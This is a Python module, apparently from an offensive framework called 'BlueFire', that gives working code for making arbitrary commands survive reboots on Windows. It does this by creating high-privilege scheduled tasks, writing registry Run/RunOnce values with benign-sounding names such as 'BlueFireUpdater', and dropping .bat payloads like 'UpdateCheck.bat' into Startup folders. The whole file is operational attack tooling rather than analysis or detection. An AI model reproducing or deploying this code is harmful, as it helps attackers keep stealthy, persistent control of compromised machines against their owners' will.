import os
import platform
import subprocess
import win32api # Required for registry access
import win32con # Required for registry access
import shutil # For copying files if needed
import tempfile # For creating temp files
from typing import Dict, Any, Tuple, Optional
import logging # Use standard logging

# Assume logger is passed or configured appropriately
logger = logging.getLogger(__name__)

class WindowsPersistence:
    """Handles Windows-specific persistence techniques."""

    def __init__(self, execute_command_func):
        """
        Initialize WindowsPersistence.

        Args:
            execute_command_func: A callable provided by the main Persistence class
                                  to execute commands (likely wrapping ExecutionModule).
        """
        self._execute_command = execute_command_func
        self.handler_map = {
            "scheduled_task": self._handle_scheduled_task,
            "registry_run_key": self._handle_registry_run_key,
            "startup_folder": self._handle_startup_folder,
            # Add other Windows techniques here
        }

    def establish(self, technique: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using a specific Windows technique."""
        handler = self.handler_map.get(technique)
        if handler:
            logger.info(f"Executing Windows persistence technique: {technique}")
            try:
                return handler(details)
            except Exception as e:
                logger.error(f"Error executing Windows persistence technique '{technique}': {e}", exc_info=True)
                return {"status": "failure", "technique": technique, "reason": str(e)}
        else:
            logger.warning(f"Unsupported Windows persistence technique requested: {technique}")
            return {"status": "failure", "technique": technique, "reason": "Unsupported technique for Windows"}

    # --- Technique Handlers ---

    def _handle_scheduled_task(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using Windows Scheduled Tasks."""
        task_name = details.get("task_name", "BlueFireDefaultTask")
        command = details.get("command")
        trigger = details.get("trigger", "ONLOGON") # e.g., ONLOGON, ONSTART, HOURLY, DAILY
        force = details.get("force", False) # Overwrite if exists? Use /F flag
        description = details.get("description", "BlueFire Persistence")

        if not command:
            return {"status": "failure", "technique": "scheduled_task", "reason": "Missing 'command' in details."}

        logger.info(f"Attempting to create scheduled task: {task_name}")
        logger.debug(f"Task Command: {command}")
        logger.debug(f"Task Trigger: {trigger}")

        # Construct the schtasks command
        schtasks_command = [
            "schtasks", "/create", "/tn", task_name,
            "/tr", f'{command}', # Ensure command quoting is handled if needed
            "/sc", trigger, "/rl", "HIGHEST", "/f" if force else ""
        ]
        # Remove empty string if /f is not used
        schtasks_command = [part for part in schtasks_command if part]

        # Add description if provided (schtasks quirks - needs separate /change command?)
        # For simplicity, create first, then optionally add description.
        # Description adding via /change /d might be less reliable or need admin.
        # Let's just create it for now. Consider adding description later if essential.

        status = "failure"
        output = ""
        error = ""
        try:
            # Use the provided execution function
            exec_result = self._execute_command(
                " ".join(schtasks_command), # Join parts into a single command string
                capture_output=True
            )
            output = exec_result.get('output', '')
            error = exec_result.get('error', '')
            return_code = exec_result.get('return_code')

            if return_code == 0:
                logger.info(f"Scheduled task '{task_name}' created successfully.")
                # Optional: Verify task creation? `schtasks /query /tn task_name`
                status = "success"
            else:
                logger.error(f"Failed to create scheduled task '{task_name}'. RC: {return_code}")
                logger.error(f"STDOUT: {output}")
                logger.error(f"STDERR: {error}")
                error = f"Failed with return code {return_code}. Error: {error or output}" # Combine outputs for reason

        except Exception as e:
            logger.error(f"Exception creating scheduled task '{task_name}': {e}", exc_info=True)
            error = str(e)

        return {
            "status": status,
            "technique": "scheduled_task",
            "task_name": task_name,
            "command": command,
            "trigger": trigger,
            "output": output,
            "reason": error if status == "failure" else None
        }

    def _handle_registry_run_key(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using Windows Registry Run Keys."""
        value_name = details.get("value_name", "BlueFireUpdater")
        command = details.get("command")
        hive_str = details.get("hive", "HKCU") # HKCU or HKLM
        key_type = details.get("key_type", "Run") # Run, RunOnce
        force = details.get("force", False) # Use /f flag

        if not command:
            return {"status": "failure", "technique": "registry_run_key", "reason": "Missing 'command' in details."}

        # Validate hive and key_type
        valid_hives = {"HKCU": win32con.HKEY_CURRENT_USER, "HKLM": win32con.HKEY_LOCAL_MACHINE}
        valid_key_types = ["Run", "RunOnce"]
        if hive_str not in valid_hives:
             return {"status": "failure", "technique": "registry_run_key", "reason": f"Invalid hive: {hive_str}. Use HKCU or HKLM."}
        if key_type not in valid_key_types:
             return {"status": "failure", "technique": "registry_run_key", "reason": f"Invalid key_type: {key_type}. Use Run or RunOnce."}

        hive = valid_hives[hive_str]
        base_key_path = f"SOFTWARE\Microsoft\Windows\CurrentVersion\{key_type}"

        logger.info(f"Attempting to set registry {key_type} key: {hive_str}\{base_key_path}\{value_name}")
        logger.debug(f"Registry Command: {command}")

        status = "failure"
        reason = ""
        key_handle = None

        try:
            # Using direct win32api for registry modification
            # Requires appropriate permissions (Admin for HKLM)

            # Open the base key with write access
            key_handle = win32api.RegOpenKeyEx(hive, base_key_path, 0, win32con.KEY_SET_VALUE | win32con.KEY_WOW64_64KEY) # Use 64-bit view

            # Check if value exists and if force is True
            value_exists = False
            try:
                win32api.RegQueryValueEx(key_handle, value_name)
                value_exists = True
            except win32api.error as e:
                if e.winerror == 2: # ERROR_FILE_NOT_FOUND
                    value_exists = False
                else:
                    raise # Re-raise other query errors

            if value_exists and not force:
                 reason = f"Registry value '{value_name}' already exists and force=False."
                 logger.warning(reason)
            else:
                 # Set the value
                 win32api.RegSetValueEx(key_handle, value_name, 0, win32con.REG_SZ, command)
                 logger.info(f"Successfully set registry value '{value_name}' in {hive_str}\{base_key_path}.")
                 status = "success"

        except win32api.error as e:
            # Handle specific Windows errors
            reason = f"Registry API error: {e.strerror} (Code: {e.winerror})"
            logger.error(f"Failed to set registry key: {reason}")
            if e.winerror == 5: # Access Denied
                 reason += " (Requires elevation for HKLM or specific permissions)."
                 logger.warning("Access Denied. Requires elevation for HKLM.")
        except Exception as e:
            reason = f"Unexpected error setting registry key: {e}"
            logger.error(reason, exc_info=True)
        finally:
            if key_handle:
                try:
                    win32api.RegCloseKey(key_handle)
                except Exception as e_close:
                     logger.warning(f"Error closing registry key handle: {e_close}")

        return {
            "status": status,
            "technique": "registry_run_key",
            "hive": hive_str,
            "key_path": base_key_path,
            "value_name": value_name,
            "command": command,
            "reason": reason if status == "failure" else None
        }

    def _get_startup_folder(self, scope: str = 'user') -> Optional[str]:
        """Gets the path to the user or common Startup folder."""
        try:
            if scope.lower() == 'user':
                # CSIDL_STARTUP = 7
                folder_id = win32con.CSIDL_STARTUP
            elif scope.lower() == 'system':
                # CSIDL_COMMON_STARTUP = 24
                folder_id = win32con.CSIDL_COMMON_STARTUP
            else:
                logger.error(f"Invalid scope specified for startup folder: {scope}. Use 'user' or 'system'.")
                return None

            # SHGetFolderPath requires pywin32 >= 223
            # Import locally to avoid import error if not available/needed elsewhere
            from win32com.shell import shell, shellcon
            startup_path = shell.SHGetFolderPath(0, folder_id, None, 0)
            if not os.path.isdir(startup_path):
                 logger.warning(f"Startup folder path found but is not a directory: {startup_path}")
                 return None
            return startup_path
        except ImportError:
            logger.error("Could not import 'win32com.shell'. Startup folder path retrieval requires pywin32 extensions.")
            return None
        except Exception as e:
            logger.error(f"Error getting startup folder path (scope: {scope}): {e}", exc_info=True)
            return None

    def _handle_startup_folder(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence using the Windows Startup folder."""
        # Parameters:
        # - command: The command to execute.
        # - file_name: The name for the .bat/.lnk file (e.g., "UpdateCheck.bat").
        # - scope: 'user' (default) or 'system' (requires elevation).
        # - payload_content: Direct content for the .bat file (overrides command).
        # - force: Overwrite if file_name already exists (default: False).

        command = details.get("command")
        file_name = details.get("file_name", f"BlueFireStartup_{os.urandom(4).hex()}.bat")
        scope = details.get("scope", "user")
        payload_content = details.get("payload_content")
        force = details.get("force", False)

        if not command and not payload_content:
            return {"status": "failure", "technique": "startup_folder", "reason": "Missing 'command' or 'payload_content' in details."}

        # Ensure file name has a reasonable extension, default to .bat
        if not os.path.splitext(file_name)[1]:
            file_name += ".bat"
            logger.debug(f"No extension provided, defaulting file name to: {file_name}")

        startup_dir = self._get_startup_folder(scope)
        if not startup_dir:
             return {"status": "failure", "technique": "startup_folder", "reason": f"Could not determine Startup folder path for scope '{scope}'."}

        target_path = os.path.join(startup_dir, file_name)
        logger.info(f"Attempting to place persistence file in Startup folder: {target_path}")

        status = "failure"
        reason = ""

        try:
            if os.path.exists(target_path) and not force:
                reason = f"File '{target_path}' already exists and force=False."
                logger.warning(reason)
                return {"status": "failure", "technique": "startup_folder", "reason": reason, "target_path": target_path}

            # Determine content for the file
            file_content = payload_content
            if not file_content:
                # Create simple .bat file content if only command is provided
                file_content = f"@echo off\n{command}\nexit /b 0"

            # Write the content to the target file
            with open(target_path, "w", encoding='utf-8') as f:
                f.write(file_content)

            # Verify file creation
            if os.path.exists(target_path):
                logger.info(f"Successfully created persistence file: {target_path}")
                status = "success"
            else:
                reason = "File write operation completed but file not found afterwards."
                logger.error(reason)

        except PermissionError as e:
            reason = f"Permission denied writing to '{target_path}'. Scope '{scope}' might require elevation." 
            logger.error(reason, exc_info=True)
        except Exception as e:
            reason = f"Unexpected error creating startup file '{target_path}': {e}"
            logger.error(reason, exc_info=True)

        return {
            "status": status,
            "technique": "startup_folder",
            "scope": scope,
            "target_path": target_path,
            "command_used": command, # Log the original command if used
            "reason": reason if status == "failure" else None
        }

    # Add other Windows-specific methods like _handle_startup_folder, _handle_wmi_subscription etc. here 